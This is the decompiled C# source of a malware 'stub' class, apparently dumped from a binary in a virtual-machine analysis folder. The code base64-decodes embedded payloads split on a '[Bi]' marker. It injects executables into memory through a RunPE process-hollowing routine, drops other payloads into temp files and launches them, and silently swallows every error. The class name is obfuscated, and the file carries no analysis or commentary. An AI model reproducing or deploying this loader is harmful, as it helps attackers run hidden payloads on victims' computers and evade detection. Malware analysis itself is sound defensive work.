// Decompiled with JetBrains decompiler
// Type: j.uUrKUuSBRRmTiQczhlKTWtHSbRblp
// Assembly: stub, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5D061B43-92C3-47A8-A000-0E762F8D5CF4
// Assembly location: C:\Users\gorno\Desktop\vm\Dumps\UnknownName\vdump_00400000.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;

namespace j
{
  public class uUrKUuSBRRmTiQczhlKTWtHSbRblp
  {
    public static bool PE = Convert.ToBoolean("True");
    public static string Arq = "";
    public static string Exte = "";
    private static byte[] Bte;

    public static void J()
    {
      try
      {
        string[] strArray1 = Strings.Split(uUrKUuSBRRmTiQczhlKTWtHSbRblp.Arq, "[Bi]", -1, CompareMethod.Binary);
        string[] strArray2 = uUrKUuSBRRmTiQczhlKTWtHSbRblp.Exte.Split(',');
        int length = strArray1.Length;
        int index = 1;
        while (index <= length)
        {
          if (Operators.CompareString(strArray2[checked (index - 1)], ".exe", false) == 0 & uUrKUuSBRRmTiQczhlKTWtHSbRblp.PE)
          {
            uUrKUuSBRRmTiQczhlKTWtHSbRblp.Bte = Convert.FromBase64String(strArray1[index]);
            RunPE.Run(uUrKUuSBRRmTiQczhlKTWtHSbRblp.Bte, (string) null, (string) null, true);
          }
          else
            uUrKUuSBRRmTiQczhlKTWtHSbRblp.e(strArray2[checked (index - 1)], strArray1[index]);
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void e(string ex, string arq)
    {
      try
      {
        string tempFileName = Path.GetTempFileName();
        string oldValue1 = ".tmp";
        string newValue1 = ex;
        File.WriteAllBytes(tempFileName.Replace(oldValue1, newValue1), Convert.FromBase64String(arq));
        string oldValue2 = ".tmp";
        string newValue2 = ex;
        Process.Start(tempFileName.Replace(oldValue2, newValue2));
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        ProjectData.ClearProjectError();
      }
    }
  }
}
